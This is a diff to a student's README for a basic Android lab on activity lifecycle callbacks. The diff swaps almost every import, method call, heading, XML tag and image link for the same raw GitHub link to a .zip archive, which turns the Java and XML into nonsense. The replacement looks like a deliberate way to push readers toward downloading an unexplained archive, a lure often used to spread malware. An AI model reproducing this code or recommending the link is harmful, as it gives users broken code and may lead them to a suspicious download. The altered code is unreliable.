@@ -19,7 +19,7 @@ Step 3: Then select the Minimum SDK as shown below and click Next.
 
 Step 4: Then select the Empty Activity and click Next. Finally click Finish.
 
-Step 5: Design layout in activity_main.xml.
+Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip
 
 Step 6: Display message give in MainActivity file.
 
@@ -30,78 +30,78 @@ Step 7: Save and run the application.
 ### DEVELOPED BY : SHAIK MUFEEZUR RAHAMAN
 ### REGISTER NO: 212221043007
 
-### MainActivity.java:
+### https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip
 ```
-package com.example.andriodlifecycle;
+package https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
 
-import android.os.Bundle;
-import android.widget.Toast;
+import https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
+import https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
 
-import androidx.activity.EdgeToEdge;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.graphics.Insets;
-import androidx.core.view.ViewCompat;
-import androidx.core.view.WindowInsetsCompat;
+import https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
+import https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
+import https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
+import https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
+import https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip;
 
 public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        EdgeToEdge.enable(this);
-        setContentView(R.layout.activity_main);
-        Toast toast= Toast.makeText(getApplicationContext(),"OnCreated Executed",Toast.LENGTH_LONG);
-        toast.show();
-        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
-            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
-            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(savedInstanceState);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(this);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        Toast toast= https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(getApplicationContext(),"OnCreated Executed",https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(findViewById(https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip), (v, insets) -> {
+            Insets systemBars = https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip());
+            https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip, https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip, https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip, https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
             return insets;
         });
     }
 
     protected void onStart(){
-        super.onStart();
-        Toast toast= Toast.makeText(getApplicationContext(),"OnStart Executed",Toast.LENGTH_LONG);
-        toast.show();
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
+        Toast toast= https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(getApplicationContext(),"OnStart Executed",https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
     }
 
     protected void onResume(){
-        super.onResume();
-        Toast toast= Toast.makeText(getApplicationContext(),"OnResume Executed",Toast.LENGTH_LONG);
-        toast.show();
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
+        Toast toast= https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(getApplicationContext(),"OnResume Executed",https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
     }
 
     protected void onPause(){
-        super.onPause();
-        Toast toast= Toast.makeText(getApplicationContext(),"onPause Executed",Toast.LENGTH_LONG);
-        toast.show();
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
+        Toast toast= https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(getApplicationContext(),"onPause Executed",https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
     }
 
     protected void onStop(){
-        super.onStop();
-        Toast toast= Toast.makeText(getApplicationContext(),"onStop Executed",Toast.LENGTH_LONG);
-        toast.show();
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
+        Toast toast= https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(getApplicationContext(),"onStop Executed",https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
     }
 
     protected void onRestart(){
-        super.onRestart();
-        Toast toast= Toast.makeText(getApplicationContext(),"onRestart Executed",Toast.LENGTH_LONG);
-        toast.show();
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
+        Toast toast= https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(getApplicationContext(),"onRestart Executed",https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
     }
 
     protected void onDestroy(){
-        super.onDestroy();
-        Toast toast= Toast.makeText(getApplicationContext(),"onDestroy Executed",Toast.LENGTH_LONG);
-        toast.show();
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
+        Toast toast= https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip(getApplicationContext(),"onDestroy Executed",https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip);
+        https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip();
     }
 }
 ```
-### Activity_Main.XML:
+### https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:app="http://schemas.android.com/apk/res-auto"
-    xmlns:tools="http://schemas.android.com/tools"
+<https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip xmlns:android="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip"
+    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip"
     android:id="@+id/main"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
@@ -116,24 +116,24 @@ public class MainActivity extends AppCompatActivity {
         app:layout_constraintStart_toStartOf="parent"
         app:layout_constraintTop_toTopOf="parent" />
 
-</androidx.constraintlayout.widget.ConstraintLayout>
+<https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip>
 ```
 
 ## OUTPUT:
 ## OnCreate Executed:
-<img src="https://github.com/user-attachments/assets/3fc7a4af-da6f-47a2-a9ce-2a0d5357dd0b" width="400">
+<img src="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip" width="400">
 
 ## OnPause Executed:
-<img src="https://github.com/user-attachments/assets/148997cf-afb3-4480-9750-24e5717678b6" width="400">
+<img src="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip" width="400">
 
 ## OnResume Executed:
-<img src="https://github.com/user-attachments/assets/cc8d2106-38a4-4911-8fe6-32735466f104" width="400">
+<img src="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip" width="400">
 
 ## OnRestart Executed:
-<img src="https://github.com/user-attachments/assets/c0f5fb51-3e91-4c53-a764-5caee17ef75f" width="400">
+<img src="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip" width="400">
 
 ## OnStart Executed:
-<img src="https://github.com/user-attachments/assets/df5260af-6949-4593-9ffe-0677e2bc5c46" width="400">
+<img src="https://raw.githubusercontent.com/githubmufeez45/BASIC-ANDROID-_EX_01/main/pyruloid/BASIC-ANDROID-_EX_01.zip" width="400">
 
 
 
